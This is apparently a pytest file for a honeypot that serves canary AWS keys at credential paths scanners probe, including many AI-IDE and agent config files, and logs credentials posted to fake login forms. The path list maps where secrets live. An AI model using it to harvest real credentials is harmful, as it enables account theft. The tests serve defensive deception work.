    `_TRAP_BY_PATH` keys are lowercased so both `/.azure/azureProfile.json`
    (real camelCase filename, lowered by the dispatcher) and the lowercase
    table key route to the same trap."""
    expected = {
        "/.azure/azureprofile.json": "azure-cli-profile",
        "/.azure/accesstokens.json": "azure-cli-access-tokens",
        "/.azure/msal_token_cache.json": "azure-cli-msal-cache",
        "/.azure/service_principal_entries.json": "azure-cli-service-principal",
        "/.azure/config": "azure-cli-config",
        "/.azure/clouds.config": "azure-cli-clouds-config",
    }
    for path, name in expected.items():
        trap = tbenv._TRAP_BY_PATH.get(path)
        assert trap is not None, f"{path} not registered"
        assert trap.name == name, f"{path} routes to {trap.name} not {name}"
    # Real-world request — camelCase — must also resolve via case-insensitive
    # dispatch.
    assert tbenv.find_canary_trap("/.azure/azureProfile.json") is not None
    assert tbenv.find_canary_trap("/.azure/accessTokens.json") is not None


def test_render_generic_ai_provider_embeds_aws_canary():
    body = tbenv.render_generic_ai_api_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["api_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["apiKey"] == "AKIAFAKEEXAMPLE01"


def test_render_baseten_yaml_embeds_aws_canary():
    body = tbenv.render_baseten_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


# --- AI-IDE credential dictionary expansion (May 2026) ---


def test_ai_ide_credential_paths_registered():
    """May 2026 116-path AI-IDE credential dictionary: every observed path
    routes to a canary trap."""
    expected = {
        "/.codex/auth.json": "codex-auth",
        "/root/.codex/auth.json": "codex-auth",
        "/.gemini/oauth_creds.json": "gemini-oauth-creds",
        "/root/.gemini/oauth_creds.json": "gemini-oauth-creds",
        "/.gemini/settings.json": "gemini-settings",
        "/root/.gemini/settings.json": "gemini-settings",
        "/.cursorrules": "ai-ide-rules",
        "/.clinerules": "ai-ide-rules",
        "/.windsurfrules": "ai-ide-rules",
        "/.cursor/User/globalStorage/state.vscdb": "cursor-state-vscdb",
        "/.dashscope/api_key": "dashscope-api-key",
        "/.anthropic/api_key": "anthropic-api-key",
        "/.deepseek/config.json": "deepseek-config",
        "/.kimi/credentials/kimi-code.json": "kimi-credentials",
        "/.kimi/kimi-code.json": "kimi-credentials",
        "/.moonshot/settings.json": "kimi-credentials",
        "/.openclaw/openclaw.json": "openclaw-config",
        "/root/.openclaw/openclaw.json": "openclaw-config",
        "/root/.config/opencode/config.json": "opencode-config",
        "/root/.config/vastai/credentials.json": "vastai-credentials",
        "/root/.nerve/config.yaml": "nerve-config",
        "/root/.spawnrc": "spawnrc",
        "/root/.config/moltbook/credentials.json": "moltbook-credentials",
        "/.claude.json": "claude-config",
        "/root/.claude.json": "claude-config",
        "/.claude/config.json": "claude-config",
        "/.claude/settings.local.json": "claude-config",
        "/.claude/history.jsonl": "claude-history",
        "/root/.claude/.credentials.json": "claude-credentials-root",
        "/.config/claude/.credentials.json": "claude-credentials",
        "/.credentials.json": "claude-credentials",
        "/root/.config/claude/.credentials.json": "claude-credentials-root",
        "/AGENTS.md": "agents-md",
        "/.claude/CLAUDE.md": "agents-md",
        "/root/.claude/CLAUDE.md": "agents-md",
    }
    for path, name in expected.items():
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap for {path}"
        assert trap.name == name, f"{path} mapped to {trap.name}, expected {name}"


def test_render_codex_auth_embeds_aws_canary():
    body = tbenv.render_codex_auth_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["OPENAI_API_KEY"] == "AKIAFAKEEXAMPLE01"
    assert payload["tokens"]["refresh_token"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def test_render_gemini_oauth_creds_embeds_aws_canary():
    body = tbenv.render_gemini_oauth_creds_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["access_token"] == "AKIAFAKEEXAMPLE01"
    assert payload["refresh_token"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["token_type"] == "Bearer"


def test_render_gemini_settings_embeds_aws_canary():
    body = tbenv.render_gemini_settings_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["GOOGLE_API_KEY"] == "AKIAFAKEEXAMPLE01"


def test_render_ai_rules_embeds_aws_canary():
    body = tbenv.render_ai_rules_text(FAKE_TRACEBIT).decode("utf-8")
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "AKIAFAKEEXAMPLE01" in body
    assert "staging.internal.lan/agent/" in body


def test_render_ai_rules_callback_id_is_per_hit_random():
    """The internal-API callback URL must be a per-hit uuid so a replay
    against the URL is correlatable to the specific issuance."""
    b1 = tbenv.render_ai_rules_text(FAKE_TRACEBIT).decode("utf-8")
    b2 = tbenv.render_ai_rules_text(FAKE_TRACEBIT).decode("utf-8")
    m1 = re.search(r"staging\.internal\.lan/agent/([0-9a-f]{32})/", b1)
    m2 = re.search(r"staging\.internal\.lan/agent/([0-9a-f]{32})/", b2)
    assert m1 and m2 and m1.group(1) != m2.group(1)


def test_render_cursor_state_vscdb_is_real_sqlite_with_canary():
    import sqlite3
    import tempfile
    body = tbenv.render_cursor_state_vscdb(FAKE_TRACEBIT)
    assert body.startswith(b"SQLite format 3\x00"), "must look like a real SQLite db"
    with tempfile.NamedTemporaryFile(suffix=".vscdb") as fp:
        fp.write(body)
        fp.flush()
        conn = sqlite3.connect(fp.name)
        try:
            rows = dict(conn.execute("SELECT key, value FROM ItemTable").fetchall())
        finally:
            conn.close()
    assert rows["cursor.composer.apiKey"] == "AKIAFAKEEXAMPLE01"
    assert rows["anthropic.apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def test_render_plain_canary_api_key_is_aws_key_string():
    body = tbenv.render_plain_canary_api_key(FAKE_TRACEBIT)
    assert body == b"AKIAFAKEEXAMPLE01"


def test_render_deepseek_config_embeds_aws_canary():
    payload = json.loads(tbenv.render_deepseek_config_json(FAKE_TRACEBIT))
    assert payload["api_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["DEEPSEEK_API_KEY"] == "AKIAFAKEEXAMPLE01"


def test_render_kimi_credentials_embeds_aws_canary():
    payload = json.loads(tbenv.render_kimi_credentials_json(FAKE_TRACEBIT))
    assert payload["api_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["MOONSHOT_API_KEY"] == "AKIAFAKEEXAMPLE01"


def test_render_openclaw_embeds_aws_canary():
    payload = json.loads(tbenv.render_openclaw_json(FAKE_TRACEBIT))
    assert payload["apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["OPENAI_API_KEY"] == "AKIAFAKEEXAMPLE01"


def test_render_opencode_config_embeds_aws_canary():
    payload = json.loads(tbenv.render_opencode_config_json(FAKE_TRACEBIT))
    assert payload["provider"]["anthropic"]["api_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["provider"]["openai"]["api_key"] == "AKIAFAKEEXAMPLE01"


def test_render_vastai_credentials_embeds_aws_canary():
    payload = json.loads(tbenv.render_vastai_credentials_json(FAKE_TRACEBIT))
    assert payload["api_key"] == "AKIAFAKEEXAMPLE01"
    assert payload["api_secret"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def test_render_nerve_config_embeds_aws_canary():
    body = tbenv.render_nerve_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "anthropic_api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "openai_api_key: AKIAFAKEEXAMPLE01" in body


def test_render_spawnrc_embeds_aws_canary():
    body = tbenv.render_spawnrc(FAKE_TRACEBIT).decode("utf-8")
    assert "SPAWN_API_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "OPENAI_API_KEY=AKIAFAKEEXAMPLE01" in body


def test_render_moltbook_credentials_embeds_aws_canary():
    payload = json.loads(tbenv.render_moltbook_credentials_json(FAKE_TRACEBIT))
    assert payload["api_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def test_render_claude_config_embeds_aws_canary():
    payload = json.loads(tbenv.render_claude_config_json(FAKE_TRACEBIT))
    assert payload["primaryApiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["anthropicApiKey"] == "AKIAFAKEEXAMPLE01"
    assert payload["env"]["ANTHROPIC_API_KEY"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def test_render_claude_history_embeds_aws_canary():
    body = tbenv.render_claude_history_jsonl(FAKE_TRACEBIT).decode("utf-8")
    lines = [json.loads(l) for l in body.strip().split("\n")]
    assert len(lines) == 2
    joined = " ".join(l["message"] for l in lines)
    assert "AKIAFAKEEXAMPLE01" in joined
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in joined


def test_render_claude_history_callback_id_is_per_hit_random():
    b1 = tbenv.render_claude_history_jsonl(FAKE_TRACEBIT).decode("utf-8")
    b2 = tbenv.render_claude_history_jsonl(FAKE_TRACEBIT).decode("utf-8")
    m1 = re.search(r"staging\.internal\.lan/agent/([0-9a-f]{32})/", b1)
    m2 = re.search(r"staging\.internal\.lan/agent/([0-9a-f]{32})/", b2)
    assert m1 and m2 and m1.group(1) != m2.group(1)


def test_render_agents_md_embeds_aws_canary():
    body = tbenv.render_agents_md(FAKE_TRACEBIT).decode("utf-8")
    assert "ANTHROPIC_API_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "OPENAI_API_KEY=AKIAFAKEEXAMPLE01" in body


@pytest.mark.parametrize("path,expected_result,canary_substring", [
    ("/.codex/auth.json", "codex-auth", "AKIAFAKEEXAMPLE01"),
    ("/root/.codex/auth.json", "codex-auth", "AKIAFAKEEXAMPLE01"),
    ("/.gemini/oauth_creds.json", "gemini-oauth-creds", "wJalrXUtnFEMI"),
    ("/.gemini/settings.json", "gemini-settings", "wJalrXUtnFEMI"),
    ("/.cursorrules", "ai-ide-rules", "AKIAFAKEEXAMPLE01"),
    ("/.windsurfrules", "ai-ide-rules", "AKIAFAKEEXAMPLE01"),
    ("/.clinerules", "ai-ide-rules", "AKIAFAKEEXAMPLE01"),
    ("/.dashscope/api_key", "dashscope-api-key", "AKIAFAKEEXAMPLE01"),
    ("/.anthropic/api_key", "anthropic-api-key", "AKIAFAKEEXAMPLE01"),
    ("/.deepseek/config.json", "deepseek-config", "AKIAFAKEEXAMPLE01"),
    ("/.kimi/credentials/kimi-code.json", "kimi-credentials", "wJalrXUtnFEMI"),
    ("/.moonshot/settings.json", "kimi-credentials", "wJalrXUtnFEMI"),
    ("/.openclaw/openclaw.json", "openclaw-config", "wJalrXUtnFEMI"),
    ("/root/.config/opencode/config.json", "opencode-config", "wJalrXUtnFEMI"),
    ("/root/.config/vastai/credentials.json", "vastai-credentials", "AKIAFAKEEXAMPLE01"),
    ("/root/.nerve/config.yaml", "nerve-config", "wJalrXUtnFEMI"),
    ("/root/.spawnrc", "spawnrc", "wJalrXUtnFEMI"),
    ("/root/.config/moltbook/credentials.json", "moltbook-credentials", "wJalrXUtnFEMI"),
    ("/.claude.json", "claude-config", "wJalrXUtnFEMI"),
    ("/.claude/config.json", "claude-config", "wJalrXUtnFEMI"),
    ("/.claude/settings.local.json", "claude-config", "wJalrXUtnFEMI"),
    ("/.claude/history.jsonl", "claude-history", "AKIAFAKEEXAMPLE01"),
    ("/root/.claude/.credentials.json", "claude-credentials-root", "AKIAFAKEEXAMPLE01"),
    ("/.config/claude/.credentials.json", "claude-credentials", "AKIAFAKEEXAMPLE01"),
    ("/.credentials.json", "claude-credentials", "AKIAFAKEEXAMPLE01"),
    ("/root/.config/claude/.credentials.json", "claude-credentials-root", "AKIAFAKEEXAMPLE01"),
    ("/AGENTS.md", "agents-md", "AKIAFAKEEXAMPLE01"),
    ("/.claude/CLAUDE.md", "agents-md", "AKIAFAKEEXAMPLE01"),
])
async def test_dispatch_routes_ai_ide_paths_to_traps(
    flux_client, monkeypatch, path, expected_result, canary_substring,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.94"})
    assert resp.status == 200, f"expected 200 for {path}"
    body = await resp.read()
    assert canary_substring.encode("utf-8") in body, f"{path} body missing {canary_substring}"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == expected_result


@pytest.mark.parametrize("path,expected_result,canary_substring", [
    ("/.claude/settings.json", "claude-settings", "AKIAFAKEEXAMPLE01"),
    ("/.cline/settings.json", "cline-settings", "AKIAFAKEEXAMPLE01"),
    ("/.cline/mcp_settings.json", "mcp-config", "AKIAFAKEEXAMPLE01"),
    ("/.continue/config.json", "continue-config", "AKIAFAKEEXAMPLE01"),
    ("/.sourcegraph/cody.json", "cody-config", "wJalrXUtnFEMI"),
    ("/.aider.conf.yml", "aider-conf", "AKIAFAKEEXAMPLE01"),
    ("/.config/open-interpreter/config.yaml", "open-interpreter-config", "wJalrXUtnFEMI"),
    ("/litellm_config.yaml", "litellm-config", "AKIAFAKEEXAMPLE01"),
    ("/langsmith.env", "langsmith-env", "wJalrXUtnFEMI"),
    ("/.huggingface/token", "huggingface-token", "AKIAFAKEEXAMPLE01"),
    ("/.cache/huggingface/token", "huggingface-token", "AKIAFAKEEXAMPLE01"),
    ("/.streamlit/secrets.toml", "streamlit-secrets", "AKIAFAKEEXAMPLE01"),
    ("/openai.json", "openai-config-flat", "AKIAFAKEEXAMPLE01"),
    ("/anthropic.json", "anthropic-config-flat", "AKIAFAKEEXAMPLE01"),
    ("/cohere_config.json", "ai-provider-config", "wJalrXUtnFEMI"),
    ("/.bito/config.json", "ai-provider-config", "wJalrXUtnFEMI"),
    ("/baseten.yaml", "baseten-config", "wJalrXUtnFEMI"),
])
async def test_dispatch_routes_ai_toolchain_paths_to_traps(
    flux_client, monkeypatch, path, expected_result, canary_substring,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.93"})
    assert resp.status == 200, f"expected 200 for {path}"
    body = await resp.read()
    assert canary_substring.encode("utf-8") in body, f"{path} body missing {canary_substring}"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == expected_result


# --- Web-app form responder ----------------------------------------------


def test_webapp_form_enabled_by_default():
    assert tbenv.WEBAPP_FORM_ENABLED


@pytest.mark.parametrize("path,suffix", [
    ("/login", "login"),
    ("/signin", "login"),
    ("/sign_in", "login"),
    ("/auth/login", "login"),
    ("/api/login", "login"),
    ("/admin/login", "login"),
    ("/signup", "signup"),
    ("/sign_up", "signup"),
    ("/register", "signup"),
    ("/auth/register", "signup"),
    ("/checkout", "checkout"),
    ("/cart", "checkout"),
    ("/order/checkout", "checkout"),
    ("/contact", "contact"),
    ("/contact-us", "contact"),
    ("/api/contact", "contact"),
    ("/subscribe", "contact"),
    ("/newsletter", "contact"),
    ("/profile", "profile"),
    ("/dashboard", "profile"),
    ("/settings", "profile"),
    ("/admin", "profile"),
    ("/api/profile", "profile"),
])
def test_webapp_form_path_match_classifies_correctly(path, suffix):
    assert tbenv.is_webapp_form_path(path), f"expected match: {path}"
    assert tbenv._webapp_form_match(path) == suffix


@pytest.mark.parametrize("path", [
    # Trailing-slash tolerance
    "/login/", "/signup/", "/checkout/", "/contact/", "/profile/",
    # Case insensitivity
    "/Login", "/CHECKOUT", "/Auth/Login",
])
def test_webapp_form_path_match_tolerates_slash_and_case(path):
    assert tbenv.is_webapp_form_path(path), f"expected match: {path}"


@pytest.mark.parametrize("path", [
    # These belong to other handlers / shouldn't shadow form trap nor be claimed by it
    "/.env", "/.git/config", "/wp-login.php",
    # Generic non-form paths
    "/", "/index.html", "/robots.txt", "/favicon.ico",
    "/random-page", "/api/v4/user",
    # Looks login-ish but isn't in the configured set
    "/loginz", "/sign_inn", "/checkout-thank-you",
])
def test_webapp_form_path_non_match(path):
    assert not tbenv.is_webapp_form_path(path), f"should not match: {path}"


def test_webapp_form_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "WEBAPP_FORM_ENABLED", False)
    assert not tbenv.is_webapp_form_path("/login")
    assert not tbenv.is_webapp_form_path("/checkout")


def test_webapp_form_extra_paths_get_form_suffix():
    # Operator-supplied extras land under the generic `form` suffix.
    # Built-ins keep their own classification (regression).
    assert tbenv.WEBAPP_FORM_PATH_SUFFIX["/login"] == "login"
    assert tbenv.WEBAPP_FORM_PATH_SUFFIX["/checkout"] == "checkout"


def test_webapp_form_render_html_includes_username_and_password_fields():
    body = tbenv.render_webapp_form_html(
        suffix="login", path="/login", csrf_token="abc123",
    )
    assert b'name="username"' in body
    assert b'name="password"' in body
    assert b'name="csrf_token"' in body
    assert b'value="abc123"' in body
    assert b'action="/login"' in body


def test_webapp_form_render_signup_includes_email_field():
    body = tbenv.render_webapp_form_html(
        suffix="signup", path="/signup", csrf_token="t",
    )
    assert b'name="email"' in body
    assert b'name="username"' in body
    assert b'name="password"' in body


def test_webapp_form_render_escapes_path_query():
    body = tbenv.render_webapp_form_html(
        suffix="login", path='/login"><script>x</script>', csrf_token="t",
    )
    assert b"<script>" not in body
    assert b"&lt;script&gt;" in body


def test_webapp_form_extract_creds_from_urlencoded():
    body = b"username=alice&password=hunter2&csrf_token=t"
    user, has_pw, has_email, fields = tbenv.extract_webapp_form_creds(
        body, "application/x-www-form-urlencoded",
    )
    assert user == "alice"
    assert has_pw is True
    assert has_email is False
    assert "username" in fields and "password" in fields


def test_webapp_form_extract_creds_email_username():
    body = b"email=bob%40example.com&password=p"
    user, has_pw, has_email, fields = tbenv.extract_webapp_form_creds(
        body, "application/x-www-form-urlencoded",
    )
    assert user == "bob@example.com"
    assert has_pw is True
    assert has_email is True


def test_webapp_form_extract_creds_no_password_does_not_invent_one():
    body = b"username=carol"
    user, has_pw, has_email, _fields = tbenv.extract_webapp_form_creds(
        body, "application/x-www-form-urlencoded",
    )
    assert user == "carol"
    assert has_pw is False


def test_webapp_form_extract_creds_from_json_body():
    body = b'{"username":"dan","password":"x","email":"dan@e.com"}'
    user, has_pw, has_email, fields = tbenv.extract_webapp_form_creds(
        body, "application/json",
    )
    assert user == "dan"
    assert has_pw is True
    assert has_email is True
    assert "email" in fields


async def test_dispatch_get_login_returns_form_html(flux_client, monkeypatch):
    resp = await flux_client.get(
        "/login", headers={"X-Forwarded-For": "203.0.113.50"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("text/html")
    body = await resp.read()
    assert b'name="username"' in body
    assert b'name="password"' in body
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    assert entries[0]["result"] == "webapp-form-login"
    assert entries[0]["status"] == 200
    assert entries[0]["clientIp"] == "203.0.113.50"


async def test_dispatch_post_login_returns_302_and_logs_credentials(
    flux_client, monkeypatch,
):
    resp = await flux_client.post(
        "/login",
        data="username=alice&password=hunter2",
        headers={
            "X-Forwarded-For": "203.0.113.51",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        allow_redirects=False,
    )
    assert resp.status == 302
    assert resp.headers["Location"].startswith("/login")
    assert "session_id=" in resp.headers.get("Set-Cookie", "")
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    entry = entries[0]
    assert entry["result"] == "webapp-form-login"
    assert entry["status"] == 302
    assert entry["webappFormUsername"] == "alice"
    assert entry["webappFormHasPassword"] is True
    assert entry["webappFormMethod"] == "POST"
    # Body preview is recorded so the full form payload is auditable.
    assert "username=alice" in entry.get("bodyPreview", "")


async def test_dispatch_post_signup_classifies_signup_suffix(
    flux_client, monkeypatch,
):
    resp = await flux_client.post(
        "/signup",
        data="email=eve@example.com&username=eve&password=x",
        headers={
            "X-Forwarded-For": "203.0.113.52",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        allow_redirects=False,
    )
    assert resp.status == 302
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "webapp-form-signup"
    assert entry["webappFormHasEmail"] is True


async def test_dispatch_webapp_form_disabled_returns_404(
    flux_client, monkeypatch,
):
    monkeypatch.setattr(tbenv, "WEBAPP_FORM_ENABLED", False)
    resp = await flux_client.get(
        "/login", headers={"X-Forwarded-For": "203.0.113.53"},
    )
    assert resp.status == 404
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "not-handled"


async def test_dispatch_webapp_form_does_not_shadow_canary_traps(
    flux_client, monkeypatch,
):
    """`/.env` and `/.git/config` must keep going through their canary
    handlers even when the form trap is enabled — the dispatch order is
    canary-trap-first, form-second by intent."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    for path in ["/.env", "/.git/HEAD"]:
        resp = await flux_client.get(
            path, headers={"X-Forwarded-For": "203.0.113.54"},
        )
        # Without API_KEY canary handlers 404 — the form trap must not
        # claim those paths and synthesize a 200 form on top.
        assert resp.status == 404, f"unexpected status for {path}"


# --- OpenAPI / Swagger trap ---


def test_openapi_swagger_enabled_by_default():
    """Trap is cheap; default-on like every other family."""
    assert tbenv.OPENAPI_SWAGGER_ENABLED


@pytest.mark.parametrize("path,kind", [
    # SpringDoc / Swashbuckle / drf-yasg / NSwag JSON variants
    ("/swagger.json", "spec-json"),
    ("/swagger/v1/swagger.json", "spec-json"),
    ("/swagger/v2/swagger.json", "spec-json"),
    ("/swagger/v3/swagger.json", "spec-json"),
    ("/swagger/swagger.json", "spec-json"),
    ("/api-docs", "spec-json"),
    ("/api-docs/", "spec-json"),
    ("/api-docs.json", "spec-json"),
    ("/api-docs/swagger.json", "spec-json"),
    ("/v2/api-docs", "spec-json"),
    ("/v3/api-docs", "spec-json"),
    ("/openapi.json", "spec-json"),
    ("/openapi", "spec-json"),
    ("/api/v1/openapi.json", "spec-json"),
    # YAML variants
    ("/openapi.yaml", "spec-yaml"),
    ("/openapi.yml", "spec-yaml"),
    ("/swagger.yaml", "spec-yaml"),
    # UI bootstrap HTML variants
    ("/swagger-ui.html", "ui-html"),
    ("/swagger-ui/", "ui-html"),
    ("/swagger-ui/index.html", "ui-html"),
    ("/swagger/index.html", "ui-html"),
    ("/swagger/swagger-ui.html", "ui-html"),
    ("/webjars/swagger-ui/index.html", "ui-html"),
    ("/api/docs", "ui-html"),
    ("/docs", "ui-html"),
    ("/redoc", "ui-html"),
    ("/redoc.html", "ui-html"),
])
def test_openapi_swagger_path_classification(path, kind):
    assert tbenv.openapi_swagger_kind(path) == kind, f"{path} should map to {kind}"
    assert tbenv.is_openapi_swagger_path(path)


def test_openapi_swagger_path_case_insensitive():
    assert tbenv.openapi_swagger_kind("/Swagger.JSON") == "spec-json"
    assert tbenv.openapi_swagger_kind("/V3/API-DOCS") == "spec-json"
    assert tbenv.openapi_swagger_kind("/SWAGGER-UI.HTML") == "ui-html"


@pytest.mark.parametrize("path", [
    "/",
    "/swagger",
    "/api",
    "/v1/api-docs",
    "/v4/api-docs",
    "/openapi.txt",
    "/swagger-uix.html",
    "/redoc/foo",
    "/.env",
    "/.git/config",
])
def test_openapi_swagger_non_match(path):
    assert tbenv.openapi_swagger_kind(path) == ""
    assert not tbenv.is_openapi_swagger_path(path)


def test_openapi_swagger_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "OPENAPI_SWAGGER_ENABLED", False)
    assert not tbenv.is_openapi_swagger_path("/swagger.json")
    assert not tbenv.is_openapi_swagger_path("/v3/api-docs")


def test_render_openapi_spec_embeds_canary_in_three_slots():
    """The fake spec must place the canary in `securitySchemes`,
    `servers.variables`, and `info.description` so a credential scraper
    that extracts any of those slots gets a replay-fireable key."""
    body = tbenv.render_openapi_spec(FAKE_TRACEBIT, "api.example.com")
    payload = json.loads(body)
    access_key = FAKE_TRACEBIT["aws"]["awsAccessKeyId"]
    secret_key = FAKE_TRACEBIT["aws"]["awsSecretAccessKey"]
    # description
    assert access_key in payload["info"]["description"]
    # securitySchemes
    schemes = payload["components"]["securitySchemes"]
    assert schemes["bearerAuth"]["x-example"] == access_key
    assert schemes["apiKeyAuth"]["x-example"] == access_key
    # servers.variables
    assert payload["servers"][0]["variables"]["adminApiKey"]["default"] == secret_key


def test_render_openapi_spec_yaml_includes_canary():
    """YAML rendering must keep the canary access key reachable by a
    plain-text `grep AKIA…` (the substring scrapers run)."""
    body = tbenv.render_openapi_spec(FAKE_TRACEBIT, "api.example.com", yaml=True)
    text = body.decode("utf-8")
    assert FAKE_TRACEBIT["aws"]["awsAccessKeyId"] in text
    assert FAKE_TRACEBIT["aws"]["awsSecretAccessKey"] in text
    assert "openapi:" in text


def test_render_openapi_spec_advertises_followup_paths():
    """The spec advertises endpoints that route into other traps so
    follow-up enumeration walks our handler set, not a 404 wall."""
    body = tbenv.render_openapi_spec(FAKE_TRACEBIT, "api.example.com")
    payload = json.loads(body)
    paths = set(payload["paths"].keys())
    assert "/auth/login" in paths
    assert "/admin/config" in paths
    assert "/actuator/env" in paths


def test_render_swagger_ui_html_points_at_spec_url():
    body = tbenv.render_swagger_ui_html("api.example.com")
    text = body.decode("utf-8")
    assert "/swagger.json" in text
    assert "SwaggerUIBundle" in text


def test_render_redoc_html_points_at_openapi_json():
    body = tbenv.render_redoc_html("api.example.com")
    text = body.decode("utf-8")
    assert "/openapi.json" in text
    assert "redoc" in text.lower()


@pytest.mark.parametrize("path", [
    "/swagger.json",
    "/v3/api-docs",
    "/openapi.json",
])
async def test_dispatch_routes_openapi_json_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.71"})
    assert resp.status == 200
    assert "application/json" in resp.headers["Content-Type"]
    body = await resp.read()
    payload = json.loads(body)
    assert payload["openapi"].startswith("3.")
    # Canary access key is reachable in the response body
    assert FAKE_TRACEBIT["aws"]["awsAccessKeyId"].encode() in body
    entries = _log_entries(flux_client.log_path)
    last = entries[-1]
    assert last["result"] == "openapi-spec-json-issued"
    assert last["swaggerKind"] == "spec-json"
    assert last["canaryStatus"] == "issued"
    assert "aws" in last["canaryTypes"]


async def test_dispatch_routes_openapi_yaml_to_trap(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/openapi.yaml", headers={"X-Forwarded-For": "203.0.113.72"},
    )
    assert resp.status == 200
    assert "yaml" in resp.headers["Content-Type"]
    body = await resp.read()
    assert FAKE_TRACEBIT["aws"]["awsAccessKeyId"].encode() in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "openapi-spec-yaml-issued"


async def test_dispatch_routes_swagger_ui_to_trap(flux_client, monkeypatch):
    """UI bootstrap path returns Swagger UI HTML without needing a canary —
    the canary lands when the scanner follows the embedded /swagger.json
    link."""
    resp = await flux_client.get(
        "/swagger-ui.html", headers={"X-Forwarded-For": "203.0.113.73"},
    )
    assert resp.status == 200
    assert "text/html" in resp.headers["Content-Type"]
    body = await resp.read()
    assert b"SwaggerUIBundle" in body
    assert b"/swagger.json" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "openapi-swagger-ui-html"
    assert entries[-1]["swaggerKind"] == "ui-html"


async def test_dispatch_routes_redoc_to_trap(flux_client, monkeypatch):
    resp = await flux_client.get(
        "/redoc", headers={"X-Forwarded-For": "203.0.113.74"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"redoc" in body.lower()
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "openapi-redoc-html"


async def test_dispatch_openapi_swagger_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "OPENAPI_SWAGGER_ENABLED", False)
    resp = await flux_client.get(
        "/swagger.json", headers={"X-Forwarded-For": "203.0.113.75"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


async def test_dispatch_openapi_without_api_key_returns_skeleton(
    flux_client, monkeypatch,
):
    """Without TRACEBIT_API_KEY we still serve a plausible (but credential-
    free) spec so nginx-visible probes don't see a 404 — a 404 wall is
    cheaper for a scanner to fingerprint than a credential-free spec is
    valuable to an attacker."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/swagger.json", headers={"X-Forwarded-For": "203.0.113.76"},
    )
    assert resp.status == 200
    body = await resp.read()
    payload = json.loads(body)
    assert payload["openapi"].startswith("3.")
    # No AKIA-shaped key in the skeleton
    assert b"AKIA" not in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "openapi-spec-json-skeleton"


async def test_dispatch_openapi_does_not_shadow_other_traps(
    flux_client, monkeypatch,
):
    """The openapi-swagger path set is disjoint from other trap path sets —
    `/.env`, `/.git/config`, `/login`, `/v1/models` must keep routing to
    their own handlers."""
